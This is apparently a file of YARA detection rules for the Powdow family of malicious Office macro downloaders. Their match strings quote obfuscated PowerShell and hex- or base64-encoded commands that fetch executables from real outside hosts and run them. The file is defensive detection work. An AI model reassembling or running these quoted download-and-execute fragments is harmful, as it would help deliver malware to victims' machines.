rule TrojanDownloader_O97M_Powdow_ANDT_2147771499_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ANDT!MTB"
        threat_id = "2147771499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://pickleballreducer.com/robot/to.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ANDT_2147771499_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ANDT!MTB"
        threat_id = "2147771499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "power\" & helll & \" -w h Start-BitsTransfer -Sou htt`ps://thundercrack.org/offupdate.exe -Dest C:\\Users\\Public\\everyonehigh.exe;C:\\Users\\Public\\everyonehigh.exe" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\fsv.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VIS_2147771522_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VIS!MTB"
        threat_id = "2147771522"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+'loadFile')" ascii //weight: 1
        $x_1_2 = "bypass stARt" ascii //weight: 1
        $x_1_3 = "ttps://tinyurl.com/y8pbownt" ascii //weight: 1
        $x_1_4 = "Destination \"${enV`:appdata}" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VIS_2147771522_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VIS!MTB"
        threat_id = "2147771522"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://cutt.ly/jjfIQ8u','pd" ascii //weight: 1
        $x_1_2 = "'Down'+'loadFile'" ascii //weight: 1
        $x_1_3 = "owershe^l^l -w 1" ascii //weight: 1
        $x_1_4 = "attrib +s +h p" ascii //weight: 1
        $x_1_5 = "bat').B.n." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LYZ_2147771575_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LYZ!MTB"
        threat_id = "2147771575"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/phCk6vQ'," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TMP_2147771738_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TMP!MTB"
        threat_id = "2147771738"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "wer^she" ascii //weight: 1
        $x_1_2 = "-w 1 stARt`-s" ascii //weight: 1
        $x_1_3 = {4d 6f 76 65 2d 49 74 65 6d 20 22 70 64 [0-21] 62 61 74 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 24 65 60 6e 56 3a 54 60 45 4d 50 22}  //weight: 1, accuracy: Low
        $x_1_4 = "-w 1 stARt`-slE`Ep" ascii //weight: 1
        $x_1_5 = "Remove-Item -Path pd" ascii //weight: 1
        $x_1_6 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_7 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_8 = {22 49 6e 76 6f 6b 65 22 28 27 68 74 74 70 73 3a 2f 2f 63 75 74 74 2e 6c 79 2f [0-16] 27 2c 27 70 64}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LZZ_2147771837_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LZZ!MTB"
        threat_id = "2147771837"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wer^she^l^l" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://tinyurl.com/y6vlghvu" ascii //weight: 1
        $x_1_4 = "(nEw-oB`jecT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VA_2147771839_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VA!MTB"
        threat_id = "2147771839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "s = s + \"/MI\" + \"N C:\\Wi\" + \"ndo\"" ascii //weight: 1
        $x_1_2 = "s = s + \"ws\\Sys\" + \"tem32\\\" + \"Wind\" + \"owsPo\" + \"wer\"" ascii //weight: 1
        $x_1_3 = "s = s + \"She\" + \"ll\\v1.0\" + \"\\pow\" + \"ersh\" + \"ell.\" + \"exe\"" ascii //weight: 1
        $x_1_4 = "s = s + \" -win \" + \"1 -e\" + \"nc \"" ascii //weight: 1
        $x_1_5 = "s = s + \"JABQAHIAbw" ascii //weight: 1
        $x_1_6 = "Shell(bat, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VA_2147771839_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VA!MTB"
        threat_id = "2147771839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "6C69637920627970617373202D572048696464656E202D636F6D6D616E6420286E65772D6F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F7365762E6D696C656E62617A696E736B692E6D653A323039352F70732F6C" ascii //weight: 1
        $x_1_2 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
        $x_1_3 = "ChrEncode = sStr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VA_2147771839_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VA!MTB"
        threat_id = "2147771839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ws\\System32\\\" + \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_2 = "\" -win 1 -enc\"" ascii //weight: 1
        $x_1_3 = "Shell(batch, 0)" ascii //weight: 1
        $x_1_4 = "+ \"LgBzAGgALwBnAGU\"" ascii //weight: 1
        $x_1_5 = "+ \"AdAAvAEgAeQBLAH\"" ascii //weight: 1
        $x_1_6 = "+ \"kAbQB2AC8AdwBvA\"" ascii //weight: 1
        $x_1_7 = "+ \"HIAZABhAHIAdAAu\"" ascii //weight: 1
        $x_1_8 = "+ \"AGUAeABlACIALAA\"" ascii //weight: 1
        $x_1_9 = "+ \"iACQAZQBuAHYAOg\"" ascii //weight: 1
        $x_1_10 = "+ \"BBAFAAUABEAEEAV\"" ascii //weight: 1
        $x_1_11 = "+ \"ABBAFwAJABQAHIA\"" ascii //weight: 1
        $x_1_12 = "+ \"bwBjAE4AYQBtAGU\"" ascii //weight: 1
        $x_1_13 = "+ \"AIgApADsAUwB0AG\"" ascii //weight: 1
        $x_1_14 = "+ \"EAcgB0AC0AUAByA\"" ascii //weight: 1
        $x_1_15 = "+ \"G8AYwBlAHMAcwAg\"" ascii //weight: 1
        $x_1_16 = "+ \"ACgAIgAkAGUAbgB\"" ascii //weight: 1
        $x_1_17 = "+ \"2ADoAQQBQAFAARA\"" ascii //weight: 1
        $x_1_18 = "+ \"BBAFQAQQBcACQAU\"" ascii //weight: 1
        $x_1_19 = "+ \"AByAG8AYwBOAGEA\"" ascii //weight: 1
        $x_1_20 = "+ \"bQBlACIAKQA=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VA_2147771839_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VA!MTB"
        threat_id = "2147771839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\" cne- 1 niw- exe.llehsrewop\\0.1\"" ascii //weight: 1
        $x_1_2 = "s + \"v\\llehSrewoPswodniW\\23metsyS\\swodniW\\:C" ascii //weight: 1
        $x_1_3 = "Shell(bat, 0)" ascii //weight: 1
        $x_1_4 = "+ \"JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBYAHQAYwBpAGMAZwBrAHgAegBiAG0AawB2AGsAYwBuAHcAZAB3AHYAZQBpAHoAe" ascii //weight: 1
        $x_1_5 = "+ \"AAuAGUAeABlACIAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQ" ascii //weight: 1
        $x_1_6 = "+ \"BuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBlAHgAdAByAGEAbQB" ascii //weight: 1
        $x_1_7 = "+ \"pAGwAZQBwAG8AbABpAGMAeQAuAHMAaQB0AGUALwB0AHIAaQBhAGwAZQByAHIAbwByAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6" ascii //weight: 1
        $x_1_8 = "+ \"AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiA" ascii //weight: 1
        $x_1_9 = "+ \"CQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSK_2147771920_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSK!MTB"
        threat_id = "2147771920"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://aramisconstruct.ro/wp-admin/uX/" ascii //weight: 1
        $x_1_2 = "$path='C:\\Users\\Keama\\ond_fil.dll'" ascii //weight: 1
        $x_1_3 = "strCommand = \"powershell.exe -noexit -command \" & fullString" ascii //weight: 1
        $x_1_4 = "WsShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "foreach($V3hEPMMZ in $url_list){try{$WebClient.downloadfile($V3hEPMMZ,$path)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MU_2147771947_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MU!MTB"
        threat_id = "2147771947"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dghioghiwghinghiLghioghiAghidghiFghiighiLghiE" ascii //weight: 1
        $x_1_2 = "hghitghitghipghi:ghi/ghi/ghiughinghiighitghitghioghigghirghieghiaghisghi.ghitghioghipghi/ghisghieghiaghirghicghihghi.ghipghihghip" ascii //weight: 1
        $x_1_3 = "%ghiAghipghiPghiDghiaghiTghiaghi%ghi.ghiEghiXghieghi'ghi)" ascii //weight: 1
        $x_1_4 = "ghiSghiTghiAghirghiTghi-ghipghirghiOghiCghiEghiSghiSghi" ascii //weight: 1
        $x_1_5 = "CghiMghidghi.ghieghixghiEghi ghi/ghicghi" ascii //weight: 1
        $x_1_6 = "ghiPghiOghiWghiEghirghisghihghieghilghilghi.ghieghixghiEghi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_HU_2147772065_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.HU!MTB"
        threat_id = "2147772065"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 65 67 57 72 69 74 65 20 [0-10] 28 22 34 38 34 42 34 33 35 35 35 43 34 35 36 45 37 36 36 39 37 32 36 46 36 45 36 44 36 35 36 45 37 34 35 43 37 37 36 39 36 45 36 34 36 39 37 32}  //weight: 1, accuracy: Low
        $x_1_2 = "636D64202F63207363687461736B73202F72756E202F746E205C" ascii //weight: 1
        $x_1_3 = "2D536C65657020323B2053746172742D50726F636573732024656E763A617070646174615C46656D615F4E6F746963652E6578653B2652454D" ascii //weight: 1
        $x_1_4 = "636D64202F6320737461727420705E6F77657273685E656C5E6C202D77203120416464" ascii //weight: 1
        $x_1_5 = "68747470733A2F2F6F6E6564726976652E6C6976652E636F6D2F646F776E6C6F61643F6369643D46374434373238413644434533463933" ascii //weight: 1
        $x_1_6 = "2672657369643D4637443437323841364443453346393325323131303726617574686B65793D41494338594B745450646C736D6273272C28" ascii //weight: 1
        $x_1_7 = {2e 52 75 6e 20 28 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_8 = ".RegDelete" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSL_2147772073_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSL!MTB"
        threat_id = "2147772073"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "446F776E6C6F616446696C652827687474703A2F2F3130382E36322E3131382E31372F457237485F626336472E6D7369272C2824656E763A6170706461746129" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Excel.Application\").Wait (Now + TimeValue(\"0:00:05\"))" ascii //weight: 1
        $x_1_4 = "RegDelete qwdwwxq(\"484B43555C456E7669726F6E6D656E745C77696E646972\")" ascii //weight: 1
        $x_1_5 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
        $x_1_6 = "qwdwq.Run (x)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSL_2147772073_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSL!MTB"
        threat_id = "2147772073"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "446F776E6C6F616446696C652827687474703A2F2F7175656E2E736F6674776172652F707574747965642E657865272C2824656E763A6170706461746129" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Excel.Application\").Wait (Now + TimeValue(\"0:00:05\"))" ascii //weight: 1
        $x_1_4 = "RegDelete qwdwwxq(\"484B43555C456E7669726F6E6D656E745C77696E646972\")" ascii //weight: 1
        $x_1_5 = "qwdwq.Run (x)" ascii //weight: 1
        $x_1_6 = "sStr = sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSL_2147772073_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSL!MTB"
        threat_id = "2147772073"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "446F776E6C6F616446696C652827687474703A2F2F7175656E2E736F6674776172652F732E657865272C2824656E763A61707064617461292B275C7058485A502E65786527293B53746172742D536C65657020323B2053746172742D50726F636573732024656E763A617070646174615C7058485A502E6578653B2652454D" ascii //weight: 1
        $x_1_2 = "qwdwq.RegWrite qwdwwxq(\"484B43555C456E7669726F6E6D656E745C77696E646972\")" ascii //weight: 1
        $x_1_3 = "Application.Wait (Now + TimeValue(\"0:00:05\"))" ascii //weight: 1
        $x_1_4 = "qwdwq = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
        $x_1_6 = "qwdwq.Run (x)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MN_2147772222_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MN!MTB"
        threat_id = "2147772222"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "start-process($env:APPDATA+'\\\\'+'recom.vbs" ascii //weight: 1
        $x_1_2 = "https://c.top4top.io/p_1832dqk101.jpg" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\").Run" ascii //weight: 1
        $x_1_4 = "\"wershell\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSM_2147772341_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSM!MTB"
        threat_id = "2147772341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "3b!24!75!72!6c!20!3d!20!22!68!74!74!70!3a!2f!2f!73!61!67!63!2e!62!65!2f!70!72!6f!63!2e!65!78!65!22!" ascii //weight: 1
        $x_1_2 = "24!6f!75!74!70!61!74!68!20!3d!20!22!43!3a!2f!2f!55!73!65!72!73!2f!2f!50!75!62!6c!69!63!2f!2f!70!72!6f!63!2e!65!78!65!22!" ascii //weight: 1
        $x_1_3 = "function fgjhrrrr() {return \"\"pow\"\" } function hhewr() {return \"\"ersh\"\" } function tuhjdf() {return  \"\"ell \"\"}" ascii //weight: 1
        $x_1_4 = "o.Language = \"JScript\"" ascii //weight: 1
        $x_1_5 = ".Run (\"Runner\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSN_2147772364_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSN!MTB"
        threat_id = "2147772364"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6a 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 38 34 34 6b 71 38 70 6c 31 2e 6a 70 67 40 00 44 6f 77 27 2b 27 6e 6c 27 2b 27 6f 61 64 27 2b 27 46 69 6c 27 2b 27 65 28 27 27 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "start-process($env:APPDATA+'\\\\'+'pandorinha.vbs')" ascii //weight: 1
        $x_1_3 = "Replace(a, \"#|Pandorinha|#\", \" \")" ascii //weight: 1
        $x_1_4 = "bolota = b & c & \"wershell\" & a" ascii //weight: 1
        $x_1_5 = "objqcydwyqnozj.CreateObject(\"WScript.Shell\").Run eaoasunlkm, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSN_2147772364_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSN!MTB"
        threat_id = "2147772364"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 64 69 61 6d 61 6e 74 65 73 76 69 61 67 65 6e 73 2e 63 6f 6d 2e 62 72 2f 32 30 32 31 2e 6a 50 47 47 00 44 6f 77 27 2b 27 6e 6c 27 2b 27 6f 61 64 27 2b 27 46 69 6c 27 2b 27 65 28 27 27 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "start-process($env:APPDATA+'\\\\'+'jefinhocudesapo.js'" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\").Run eaoasunlkm, 0" ascii //weight: 1
        $x_1_4 = "Set objqcydwyqnozj = GetObject(\"new:\" & OUTLOOK)" ascii //weight: 1
        $x_1_5 = "bolota = b & c & \"wershell\" & a" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VAM_2147772558_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VAM!MTB"
        threat_id = "2147772558"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "lalalaalzdafalz" ascii //weight: 1
        $x_1_2 = "zfaflzalfal" ascii //weight: 1
        $x_1_3 = "zdalflafl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AX_2147772807_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AX!MTB"
        threat_id = "2147772807"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "Shell (Environ(\"Temp\") + \"\\eWTPJ.bat\")" ascii //weight: 1
        $x_1_3 = "wwqss.Run" ascii //weight: 1
        $x_1_4 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)) - 9)" ascii //weight: 1
        $x_1_5 = "6C766D29386C297C7D6A7B7D29796778806E7B7C71676E756775293680293A2931576E" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSO_2147773769_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSO!MTB"
        threat_id = "2147773769"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_5_1 = ".oDnwoldaTsirgn('h'tt:p//rguospu..sot6:/9'd)\")" ascii //weight: 5
        $x_5_2 = "446F776E6C6F6164735472696E67272827687474703A2F2F67726F7570732E75732E746F3A36392F642729" ascii //weight: 5
